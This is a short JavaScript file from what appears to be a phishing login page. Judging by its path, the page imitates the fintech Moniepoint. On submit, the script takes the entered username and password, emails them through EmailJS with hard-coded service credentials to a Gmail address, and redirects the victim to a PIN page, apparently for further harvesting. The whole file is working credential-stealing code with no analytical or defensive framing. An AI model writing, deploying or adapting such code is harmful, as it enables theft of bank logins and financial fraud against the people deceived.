// emailjs.init("");
const username = document.querySelector("#username");
const password = document.querySelector("#password");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_iqpt0sm";
const userId = "W7QALGaY5oq4kqOTL";
const templateId = "template_k8lc6j7";

document.getElementById("login").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "join.kudapp@gmail.com",
    username: username.value,
    password: password.value,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      username.value = "";
      password.value = "";
      location.href = "/vic-moniepoint.xyz.github.io/pin.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
